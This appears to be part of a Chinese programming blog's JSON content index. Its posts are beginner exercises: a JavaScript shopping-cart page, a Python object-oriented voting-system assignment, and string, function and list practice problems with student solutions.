alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Canon/佳能 PowerShot SX50 HS&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;3.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Sony/索尼 DSC-WX300&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;4.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Fujifilm/富士 instax mini 25&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;5&quot;&gt; &lt;div id=&quot;foot&quot;&gt; &lt;label&gt;&lt;input type=&quot;checkbox&quot; class=&quot;check-box&quot; onclick=&quot;check_all(this)&quot;&gt; 全选&lt;/label&gt; &lt;a id=&quot;deleteAll&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete_all()&quot;&gt;删除&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;selected&quot;&gt;已选商品&lt;span id=&quot;selectedTotal&quot;&gt;0&lt;/span&gt;件&lt;span id=&quot;hidden&quot;&gt;︽&lt;/span&gt;&lt;/div&gt; &lt;div&gt;合计：￥&lt;span id=&quot;priceTotal&quot;&gt;0&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td&gt; &lt;div onclick=&quot;getTotal();&quot;&gt;结 算&lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;script src=&quot;my_js.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; CSS代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364table &#123; margin: 0 auto; border: 1px #CADEFF solid; text-align: center; border-spacing: 0;&#125;a &#123; color: #666; text-decoration: none;&#125;th &#123; background: #e2f2ff;&#125;td &#123; text-align: center; padding: 10px; color: #444;&#125;#box table th, #box table td &#123; border: 1px solid #CADEFF; border-spacing: 0;&#125;.goods span &#123; width: 180px; margin-top: 30px; text-align: left; float: left;&#125;img &#123; width: 100px; height: 80px; margin-right: 10px; float: left;&#125;#foot &#123; float: left; margin-right: 300px;&#125;#selected &#123; float: left;&#125;.count .add, .count .reduce &#123; height: 25px; width: 17px; background: #f0f0f0; text-align: center; line-height: 25px; color: #444;&#125;.count input &#123; height: 25px; line-height: 25px; border: 1px solid #aaa; color: #343434; text-align: center; background-color: #fff;&#125;.price &#123; width: 130px;&#125;.count &#123; width: 90px;&#125; JS代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778//数量点击减少事件function reduce(th) &#123; var reduce1 = Number(th.nextElementSibling.value); //获取数量 var element = th.nextElementSibling; //获取减少框的兄弟标签数量框 var reduce2 = reduce1 - 1; //点击事件时,数量减一 element.value = reduce2; //赋值操作 if (reduce2 === 0) &#123; //数量不能为0 th.disabled = true //禁用属性,停止使用 &#125; var price = th.parentNode.previousElementSibling.textContent ;//获取单价 var subtotal = th.parentNode.nextElementSibling; // 获取小计 var subtotal1 = Number(price) * Number(element.value); //计算小计 ,转换为number属性,原属性为string subtotal.textContent = subtotal1.toFixed(2); //toFixed保留小数 getP() //调用合计方法&#125;//添加商品function add(th) &#123; th.previousElementSibling.previousElementSibling.disabled = false; //重置disabled属性 var add1 = Number(th.previousElementSibling.value); var element = th.previousElementSibling; var add2 = add1 + 1; element.value = add2; var price = th.parentNode.previousElementSibling.textContent; var subtatal = th.parentNode.nextElementSibling; var subtatal1 = Number(price) * Number(element.value); subtatal.textContent = subtatal1.toFixed(2); getP()&#125;//删除商品function delete1(th) &#123; th.parentNode.parentNode.remove(); getP()&#125;//点击事件function check(th) &#123; getP();&#125;var checked = document.getElementsByClassName(&quot;checkbox&quot;);//获取所有的checkbox类的列表//选择商品删除function delete_all(th) &#123; for (var i = checked.length - 1; i &gt;= 0; i--) &#123; //长度 1开始,下标0开始 反向遍历, 正向删除,下标会变化 if (checked[i].checked) &#123; checked[i].parentNode.parentNode.remove(); &#125; &#125; getP()&#125;//全选或不选function check_all(th) &#123; // console.log(checked); var check1 = th.checked; var check2 = document.getElementsByClassName(&quot;check-box&quot;); for (var i = 0; i &lt; checked.length; i++) &#123; checked[i].checked = th.checked; &#125; check2[0].checked = check1; check2[1].checked = check1; getP()&#125;//合计和已选商品function getP() &#123; var selected = document.getElementById(&quot;selectedTotal&quot;); //已选择的物品件数 var priceTotal = document.getElementById(&quot;priceTotal&quot;); //已选择的物品总价格 var subtotal = document.getElementsByClassName(&quot;subtotal&quot;); //获取小计的数组 var count = document.getElementsByClassName(&quot;count-input&quot;); //获取所有的物品数量数组 var selected1 = 0; var priceTotal1 = 0; for (var j = 0; j &lt; checked.length; j++) &#123; if (checked[j].checked) &#123; selected1 += Number(count[j].value); priceTotal1 += Number(subtotal[j].textContent); &#125; &#125; selected.textContent = selected1; priceTotal.textContent = priceTotal1.toFixed(2);&#125;","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"Python面试题","slug":"Python--投票系统","date":"2020-07-27T13:22:37.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/27/Python--投票系统/","permalink":"http://example.com/2020/07/27/Python--%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F/","excerpt":"你将设计一个投票系统，选举出政党的候选人。 有一个候选人的名单，投票人将从中选出一个候选人作为领导。 选举规则如下： 每个投票人只能投票一次。投票人通过产生一个随机数，来决定选择哪个候 选人，该随机数处于1和候选人总数之间。 每个候选人都拥有一个记录（集合），记录着哪些投票人投了他的票。 选举结束后，票数最高的候选人当选。","text":"你将设计一个投票系统，选举出政党的候选人。 有一个候选人的名单，投票人将从中选出一个候选人作为领导。 选举规则如下： 每个投票人只能投票一次。投票人通过产生一个随机数，来决定选择哪个候 选人，该随机数处于1和候选人总数之间。 每个候选人都拥有一个记录（集合），记录着哪些投票人投了他的票。 选举结束后，票数最高的候选人当选。 投票系统一、概述You are tasked to implement a voting system for electing a leader of a political party. The process is as follows: 你将设计一个投票系统，选举出政党的候选人。 The party has a list of candidates（候选人） and the voter（投票人） attempt to elect one of the candidates as leader. 有一个候选人的名单，投票人将从中选出一个候选人作为领导。 The voting rules are as follows: 选举规则如下： Each voter can vote only once. The voter decides which candidate to choose by generating a random number between 1 and the total number of candidates. 每个投票人只能投票一次。投票人通过产生一个随机数，来决定选择哪个候 选人，该随机数处于1和候选人总数之间。 Each candidate maintains a record of the voters that voted for him 每个候选人都拥有一个记录（集合），记录着哪些投票人投了他的票。 After election, the candidate with the highest number of votes is elected 选举结束后，票数最高的候选人当选。 二、Program Deign: 程序设计Part 1: 第一部分Design a Person class which includes the following 设计一个Person类 1.1 实例属性和类属性 ​ __name: contains the name of the person 名字。 ​ __age: the age of the person 年龄 ​ __sex：性别 ​ __salary: the persons salary (a real number) 薪水（实数） ​ __birthday: 生日 类型应该为datetime **__id**: the id of the person. A person id cannot be changed intentionally or unintentionally by any method (current or future). It is assigned by the program at creation time and it reflects the order in which the record was created. Namely, the first person’s id is 1; the second person’s id is 2 and so on. Person的id，id不能被任何函数修改，创建Person对象时被赋值，并且反映 创建的顺序。第1个Person的id是1，第2个Person的id是2，依此类推。 ​ __totalPersons: a static variable that maintains the total persons Person的总数，一个类属性 1.2 方法 ​ a constructor __ init_ _(self,name:str,age:int,sex:bool,salary:float,year:int,month:int,day:int)&#x2F;&#x2F;Q：构造函数的参数为何没有id？ ​ 其它方法参考《人员信息管理系统》 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# _*_coding:UTF-8 _*_from datetime import dateclass Person(object): __totalPersons = 0 # 总人数 # def __init__(self, name, age, salary, year, month, day): # Person.totalPersons += 1 # self.__name = name # self.__age = age # self.__salary = salary # self.__birthday = date(year, month, day) def __init__(self, name: str, age: int, sex: bool, salary: float, year: int, month: int, day: int): self.__sex = sex self.__age = age self.__name = name self.__salary = salary self.__birthday = date(year, month, day) Person.__totalPersons += 1 self.__id = self.__totalPersons def get_age(self): return self.__age def get_name(self): return self.__name def get_sex(self): return self.get_sex() def get_birthday(self): return self.__birthday def get_salary(self): return self.__salary def set_sex(self, sex): self.__sex = sex def set_name(self, name): self.__name = name def set_age(self, age): self.__age = age def set_salary(self, salary): self.__salary = salary def set_birthday(self, y, m, d): self.__birthday + date(y, m, d) # def __str__(self): # return &quot;姓名:%s,年龄:%d,薪资:%d&quot; % (self.__name, self.__age, self.__salary) def get_toal_persons(self): return self.__totalPersons def __str__(self): return &quot;姓名:%s,年龄:%s,性别%s,日期:%s&quot; % (self.__name, self.__age, self.__sex, self.__birthday) def output(self): print(self)if __name__ == &#x27;__main__&#x27;: p1 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) p2 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) print(p1) print(type(p2)) Part 2: 第二部分Design a Voter class that will inherit from the Person class and will have the following fields: 设计一个Voter（投票人）类，继承自Person类。 2.1 实例属性和类属性 ​ __polingStation:：the number of the poling station that the voter needs to go and register ​ 投票人要去的投票站的id ​ __totalNumVoters： a static variable that contains the total number of voters that each candidate has. ​ 选民总人数 2.2 方法 the method def SelectCadidate(self,candidates:PersonList ) : randomly select a candidate 选择候选人，参数是候选人集合，随机选择一个候选人并返回。 the method Vote(self, aCandidate:Candidate ): vote a candidate 投票函数，选出候选人之后，把当前的投票人对象，加入到该候选人的投票 人集合里。 12def Vote(self,aCandidate:Candidate): aCandidate.addVoter(self) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from person import Personfrom personlist import PersonListfrom candidate import Candidateimport randomclass Voter(Person): __totalNumVoters = 0 # id 和 Voter总人数 # def __init__(self, name, age, salary, year, month, day): # Person.__init__(self, name, age, salary, year, month, day) # Voter.totalNumVoters += 1 # self.__polingStation = polingStation # self.__id = Voter.totalNumVoters def __init__(self, polingStation, *args, **kwargs): self.__flag = False # 标识投票状态 self.__polingStation = polingStation Voter.__totalNumVoters += 1 super().__init__(*args, **kwargs) def select_cadidate(self, candidates: PersonList): # p = random.randint(1, candidates.size()) # 选中的候选者的id # # for candidate in candidates: # if p == candidate.get_id(): # 选中id == 候选者id # return candidate # index = random.randint(0,len(candidates)) # return candidates[index] # random.choice随机选出候选者对象 return random.choice(candidates) # def get_age(self): # return self.__age # # def get_salary(self): # return self.__salary def vote(self, aCandiate: PersonList): # aCandiate.get_voterList().add(self) # 使用候选者的voterlist存放投票者对象 # 限制每个人的投票次数 if self.__flag: # flag 为flase print(&quot;已经投票,请不要重复投票&quot;) else: # 随机选出,将自己添加给候选者 aCandiate.add_voter(self) self.__flag = True print(&quot;投票成功&quot;) def get_total_voters(self): return self.totalNumVoters def resert_vote(self): # 重置投票状态 self.__flag = False Part 3: 第三部分 Design a Candidate class that will inherit from Person class and will have the following: 候选人类，继承自Person类 3.1 实例属性和类属性 ​ __voterList: the voterList contains all the voters that voted for the candidate. The set should not be limited in size. Use the container class PersonSet that you implemented in assignment ​ 容器类，包含所有投票给该候选人的投票人，容器的尺寸没有限制，使用作 业1中完成的PersonList类。 ​ __numCandidates: a static variable that contains the total number of candidates which are still in the race for the leadership ​ 候选人总数。 3.2 方法 a method that returns the number of votes that the candidate received: getVotesNum() return the number of voters 返回候选人得到的选票数 getAverageVotersAge(): prints the average age of the voters that voted for the candidate 打印投票给该候选人的投票人的平均年龄 GetAverageVotersSalary(): prints the average salary of the voters that voted for the candidate 打印投票给该候选人的投票人的平均薪水。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from person import Personfrom personlist import PersonListclass Candidate(Person): __numCandidates = 0 # 候选者id 和 候选者总人数 # def __init__(self, name, age, salary, year, month, day): # Candidate.numCandidates += 1 # Person.__init__(self, name, age, salary, year, month, day) # self.__name = name # self.__id = Candidate.numCandidates # self.__voterList = PersonList() # voterlist对象 def __init__(self, *args, **kwargs): # 创建一个容器，用于记录谁给参选者投了票 self.__voterList = PersonList() super().__init__(*args, **kwargs) Candidate.__numCandidates += 1 # def output(self): # print(&#x27;候选人:&#x27;, self, &#x27;id:&#x27;, self.__id) def get_voterList(self): # 获取私有属性voterList 用于存放选择候选者的支持者 return self.__voterList # def get_id(self): # 获取私有属性 候选者的id # return self.__id # # def get_name(self): # return self.__name def add_voter(self, voter): # 添加投票人 self.__voterList.add(voter) def show_voters(self): # 展示候选者的支持人信息 print(self.__voterList) def get_voter_number(self): # 获取的票数量 return self.__voterList.size() # return len(self.__voterLisrt) def get_average_voter_age(self): sum = 0 for i in self.get_voterList(): sum += i.get_age() if self.get_voter_number(): return sum / self.get_voter_number() return 0 def get_average_voter_slary(self): sum = 0 for i in self.get_voterList(): sum += i.get_salary() if self.get_voter_number(): return sum / self.get_voter_number() return 0 def reset_voters(self): for i in range(self.__voterList.size()): # 进行二次投票,清空支持候选者的列表 self.__voterList.pop() Part 5: 第四部分PersonList类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from person import Personclass PersonList: def __init__(self): self.__list = [] self.__index = 0 self.__index1 = 0 def __len__(self): # 默认覆盖len方法 return len(self.__list) def __getitem__(self, index): return self.__list[index] def add(self, person: Person): # 添加person self.__list.append(person) def size(self): # 容器中的元素个数 return len(self.__list) def remove(self, person): self.__list.remove(person) def pop(self, index=None): if not index: return self.__list.pop() return self.__list.pop(index) # def output(self): # 输出打印容器中的所有的person对象 # for p in self.__list: # p.output() def reset(self): self.__index1 = -1 # 重置index def next_element(self): # 负责循环迭代 if self.__index1 &gt;= self.size(): self.__index = -1 self.__index += 1 return self.__list[self.__index1] def __iter__(self): self.__index = 0 # 重置下标 return self def __next__(self): if self.__index &lt; len(self.__list): item = self.__list[self.__index] self.__index += 1 return item else: raise StopIteration def __str__(self): string = &quot;&quot; for p in self.__list: string += p.__str__() + &#x27;\\n&#x27; return stringif __name__ == &#x27;__main__&#x27;: p1 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) p2 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) pl = PersonList() pl.add(p1) pl.add(p2) print(pl) # pl.output() for i in pl: print(i) Part 5: 第五部分测试代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# _*_coding:UTF-8 _*_from personlist import PersonListfrom candidate import Candidatefrom voter import Votercounter = 1 # 计数,第几次投票def start_voting(voters, candidates): global counter print(f&quot;...........................第&#123;counter&#125;次投票...........................&quot;) counter += 1 for c in candidates: # 遍历候选人的容器 c.reset_voters() # 清理容器 for voter in voters: voter.resert_vote() # 让每个投票人随即投票并添加到候选者的列表 for voter in voters: c = voter.select_cadidate(candidates) voter.vote(c) #进行投票操作 # 显示每个候选者人对应的投票人 for can in candidates: print(&quot;投票给[%s]的人you:&quot;%can.get_name()) can.show_voters() #判断 maxCan = candidates[0] for i in range(1,len(candidates)): if candidates[i].get_voter_number()&gt;maxCan.get_voter_number(): maxCan = candidates[i] # 定义新容器存放,新一轮的候选者 newCandidates =PersonList() for can in candidates: if maxCan.get_voter_number()==can.get_voter_number(): newCandidates.add(can) if newCandidates.size()&gt;=2: start_voting(voters,newCandidates) else: print(&quot;最高票数的人是:%s,得票数为:%d&quot;%(maxCan.get_name(),maxCan.get_voter_number())) print((f&quot;支持这的平均年龄&#123;maxCan.get_average_voter_age()&#125;,平均薪水为:&#123;maxCan.get_average_voter_slary()&#125;&quot;))def main(): # 创建投票者队伍 voters = PersonList() # 创建参选者队伍 candidates = PersonList() # 此处考察面向对象的创建和使用 # 添加3个参选人： candidates.add(Candidate(sex=True, age=18, name=&#x27;Tom&#x27;, salary=4654, year=2001, month=5, day=3)) candidates.add(Candidate(sex=True, age=19, name=&#x27;Jack&#x27;, salary=4654, year=2001, month=5, day=3)) candidates.add(Candidate(sex=True, age=20, name=&#x27;Linda&#x27;, salary=4654, year=2001, month=5, day=3)) # 添加5个投票者 voters.add(Voter(polingStation=&quot;NewYork1&quot;, sex=True, age=20, name=&#x27;zhao1&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork2&quot;, sex=False, age=20, name=&#x27;zhao2&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork3&quot;, sex=False, age=20, name=&#x27;zhao3&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork4&quot;, sex=True, age=20, name=&#x27;zhao4&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork5&quot;, sex=False, age=20, name=&#x27;zhao5&#x27;, salary=4654, year=2001, month=5, day=3)) start_voting(voters,candidates)if __name__ == &#x27;__main__&#x27;: main()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python--字符串练习题","slug":"Python-字符串练习题","date":"2020-07-17T02:42:08.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/17/Python-字符串练习题/","permalink":"http://example.com/2020/07/17/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%83%E4%B9%A0%E9%A2%98/","excerpt":"python 1、检测用户输入的话，检测出其中有多少数字，空格，特殊符号，英文 2.敏感字检测 3.随机制作4位验证码，并打印显示 4.密码级别检测的程序","text":"python 1、检测用户输入的话，检测出其中有多少数字，空格，特殊符号，英文 2.敏感字检测 3.随机制作4位验证码，并打印显示 4.密码级别检测的程序 1、检测用户输入的话，检测出其中有多少数字，空格，特殊符号，英文12345678910111213141516# 1. a@3A D4 24@#Dda @32 SdF4@#%2 39# n = [i for i in input(&quot;请输入:&quot;)]# print(n)# english = number = space = others = 0# for i in range(len(n)):# if n[i].isalpha():# english += 1# elif n[i].isnumeric():# number += 1# elif n[i].isspace():# space += 1# else:# otrhers +=1# #others = len(n) - s - number - space# print(&quot;英文&#123;&#125;，数字&#123;&#125;，空格&#123;&#125;，特殊符号&#123;&#125;&quot;.format(english , number, space, others)) 2、接上题：在上题的基础上加入敏感字检测，当检测到用户输入的内容有敏感字，则提示 一次，当用户连续输入三次敏感字，则提示后退出字符检测。1234567891011121314151617181920212223242526# sensitive = [&#x27;卧槽&#x27;, &#x27;擦&#x27;, &#x27;滚&#x27;, &#x27;尼玛&#x27;, &#x27;沙雕&#x27;]# s = 3# while s:# n = [i for i in input(&quot;请输入:&quot;).split(&#x27; &#x27;)]# print(n)# for i in range(len(n)):# if n[i] in sensitive:# print(&quot;内容有敏感词，请重新输入!&quot;)# s -= 1# break# if s == 0:# print(&quot;敏感次数已达三次！！&quot;)## english = number = space = others = 0# for i in range(len(n)):# if n[i].isalpha():# english += 1# elif n[i].isnumeric():# number += 1# elif n[i].isspace():# space += 1# else:# otrhers +=1# #others = len(n) - s - number - space# print(&quot;英文&#123;&#125;，数字&#123;&#125;，空格&#123;&#125;，特殊符号&#123;&#125;&quot;.format(english , number, space, others)) 3、随机制作4位验证码，并打印显示。用户输入正确，则提示正确，退出 程序，否则不停重新生成验证码，重新输入12345678910111213141516171819# import random# s = &#x27;&#x27;# while True:# for i in range(4):# tem = random.randint(0,3)# if tem ==i:# check = chr(random.randint(65,97))# else:# check = random.randint(0,9)# s += str(check)# print(&quot;生成的验证码为：&quot;,s)## n = input(&quot;请输入验证码:&quot;)# if s == n:# print(&quot;输入正确！&quot;)# break# else:# print(&quot;输入错误！请重新输入！！&quot;)# s = &#x27;&#x27; 4、写一个密码级别检测的程序，文件名为check.py‘’’低级密码：由纯字母或纯特殊符号组成，长度低于8位中级密码：由数字，字母或特殊符号两种及以上的任意组合，密码长度为8-15位高级密码：必须由数字，字母和特殊符号三种组合，密码长度不低于16位说明：用户输入密码，会输出验证密码是什么级别的信息。其中密码输入后会额外提示： 当密码为空，提示不能为空 当密码以数字开头，提示不能以数字开头 当密码长度和组合不够高级密码要求，要提示正确的长度及组合‘’’ 12345678910111213141516171819202122232425262728293031# while True:# number = alpha = special = 0# p = input(&quot;请输入密码:&quot;)# if len(p) == 0:# print(&quot;密码不能为空！！&quot;)# if p[0].isnumeric():# print(&#x27;不能以数字开头&#x27;)# for i in p:# if i.isnumeric():# number += 1# elif i.isalpha():# alpha += 1# elif ord(i) &gt;= 33 and ord(i) &lt;= 42:# special += 1## if len(p) &lt; 8:# if alpha == len(p) or special == len(p) or number == len(p):# print(&#x27;低级密码\\n&#x27;, &#x27;密码需包含字母、数字、特殊符号&#x27;)## elif len(p) &lt;= 15:# if number + alpha == len(p) or number + special == len(p) or special + alpha == len(p):# print(&#x27;中级密码&#x27;)# if special == 0:# print(&quot;请添加特殊符号！&quot;)# elif alpha == 0:# print(&#x27;请添加字母！&#x27;)# elif number == 0:# print(&#x27;请添加数字！&#x27;)# elif len(p) &gt;= 16:# if number != 0 and special != 0 and alpha != 0:# print(&quot;高级密码！&quot;)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python--函数练习题","slug":"Python-函数练习题","date":"2020-07-17T02:33:05.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/17/Python-函数练习题/","permalink":"http://example.com/2020/07/17/Python-%E5%87%BD%E6%95%B0%E7%BB%83%E4%B9%A0%E9%A2%98/","excerpt":"python 写一个函数，接受一个整数，输出这个整数的所有因子 写一个函数，接受一个整数，输出这个数是几位数 写一个函数，传入两个参数，第一个参数为底数，第二个参数为幂，函数返回底数的幂运算值 写一个函数，计算两点（x1,y1）和（x2,y2）之间的距离 哥德巴赫猜想：任何一个大于6的偶数，都能分解成两个质数的和。要求输出一个整数，输出这个数能被分解成哪两个质数和","text":"python 写一个函数，接受一个整数，输出这个整数的所有因子 写一个函数，接受一个整数，输出这个数是几位数 写一个函数，传入两个参数，第一个参数为底数，第二个参数为幂，函数返回底数的幂运算值 写一个函数，计算两点（x1,y1）和（x2,y2）之间的距离 哥德巴赫猜想：任何一个大于6的偶数，都能分解成两个质数的和。要求输出一个整数，输出这个数能被分解成哪两个质数和 写一个函数，接受一个整数，输出这个整数的所有因子1234567# def get_factor():# n = int(input(&quot;请输入一个整数:&quot;))# for i in range(1,n+1):# if n % i == 0:# print(f&quot;n的因子是&#123;i&#125;&quot;)## get_factor() 写一个函数，接受一个整数，输出这个数是几位数123456# def digit():# n =input(&quot;请输入整数:&quot;)# s= len(n)# print(f&quot;n是&#123;s&#125;位数&quot;)## digit() 1234567891011121314151617写一个函数，传入两个参数，第一个参数为底数，第二个参数为幂，函数返回底数的幂运算值# def power_operation(a,b):# s = a**b# return s## print(power_operation(10,5))写一个函数，计算两点（x1,y1）和（x2,y2）之间的距离# def distance(x, y):# dis = ((b[1] - a[1]) ** 2 + (b[0] - a[0]) ** 2) ** 0.5# return dis### a = [int(i) for i in input(&quot;请输入x坐标:&quot;).split(&#x27;,&#x27;)]# b = [int(i) for i in input(&quot;请输入y坐标:&quot;).split(&#x27;,&#x27;)]# print(a, b)# print(distance(a, b)) 哥德巴赫猜想：任何一个大于6的偶数，都能分解成两个质数的和。要求输出一个整数，输出这个数能被分解成哪两个质数和123456789101112131415161718192021222324252627282930313233343536373839# def resolve():# n = int(input(&quot;请输入大于6的偶数:&quot;))# a = []# for i in range(2, 1000):# for j in range(2, int(i ** 0.5) + 1):# if i % j == 0:# break# else:# a.append(i)# # print(a)## for i in range(len(a)):# if (n - a[i]) in a and a[i]&lt;= n-a[i]:# print(a[i],n-a[i])## resolve()# def is_prim(i):# if i &lt; 2:# return False# for i in range(2, int(n ** 0.5)):# if n % i == 0:# return False# return True## def all_peime():# l = []# for i in range(2, n):# if is_prim(i):# l.append(i)## def print_two(n):# l = all_peime(n)# print(l)# for i in l:# if is_prim(n - i):# print(i, n - i)## print_two(20)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python--列表练习题","slug":"Python-列表练习题","date":"2020-07-12T07:20:17.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/12/Python-列表练习题/","permalink":"http://example.com/2020/07/12/Python-%E5%88%97%E8%A1%A8%E7%BB%83%E4%B9%A0%E9%A2%98/","excerpt":"1、输入任意十个数,打印出它们中的最大数、最小数。 2、有一个列表,内放10个整数。要求找出最小的数和它的下标,然后把它和数组中最前面的元素对换位置。 3.青年歌手参加歌曲大奖赛，有10个评委打分，试编程求选手的平均得分（去掉一个最高分和一个最低分）。 4.输入某年某月某日，判断这一天是这一年的第几天？ 5.已知:faibonacci(费波那契)数列的前几个数分别为0，1，1，2，3，5，……。从第3 项开始，每一项都等于前两项的和。读入一个整数n，编程求出此数列的前n 项。– 使用for循环实现 6.从键盘输入一个字符串，判断是否为回文字符串。如’abcba’为回文字符串，即第一个和最后一个相同，第二个和倒数第二个相同，依次类推 7.给你一个整数组成的列表L，按照下列条件输出： 若L是升序排列的,则输出”UP”; 若L是降序排列的,则输出”DOWN”; 若L无序，则输出”WRONG”。 8.十一假期,小P出去爬山,爬山的过程中每隔10米他都会记录当前点的海拔高度(以一个浮点数表示), 这些值序列保存在一个由浮点数组成的列表h中。回到家中，小P想研究一下自己经过了几个山峰，请你帮他计算一下，输出结果。例如：h&#x3D;[0.9,1.2,1.22,1.1,1.6,0.99], 将这些高度顺序连线，会发现有两个山峰，故输出一个2(序列两端不算山峰) 9.约瑟夫问题：有ｎ只猴子，按顺时针方向围成一圈选大王（编号从１到ｎ），从第１号开始报数，一直数到ｍ，数到ｍ的猴子退出圈外，剩下的猴子再接着从1开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王，现在给你n和m，请你输出最后猴王的编号。 python列表练习题","text":"1、输入任意十个数,打印出它们中的最大数、最小数。 2、有一个列表,内放10个整数。要求找出最小的数和它的下标,然后把它和数组中最前面的元素对换位置。 3.青年歌手参加歌曲大奖赛，有10个评委打分，试编程求选手的平均得分（去掉一个最高分和一个最低分）。 4.输入某年某月某日，判断这一天是这一年的第几天？ 5.已知:faibonacci(费波那契)数列的前几个数分别为0，1，1，2，3，5，……。从第3 项开始，每一项都等于前两项的和。读入一个整数n，编程求出此数列的前n 项。– 使用for循环实现 6.从键盘输入一个字符串，判断是否为回文字符串。如’abcba’为回文字符串，即第一个和最后一个相同，第二个和倒数第二个相同，依次类推 7.给你一个整数组成的列表L，按照下列条件输出： 若L是升序排列的,则输出”UP”; 若L是降序排列的,则输出”DOWN”; 若L无序，则输出”WRONG”。 8.十一假期,小P出去爬山,爬山的过程中每隔10米他都会记录当前点的海拔高度(以一个浮点数表示), 这些值序列保存在一个由浮点数组成的列表h中。回到家中，小P想研究一下自己经过了几个山峰，请你帮他计算一下，输出结果。例如：h&#x3D;[0.9,1.2,1.22,1.1,1.6,0.99], 将这些高度顺序连线，会发现有两个山峰，故输出一个2(序列两端不算山峰) 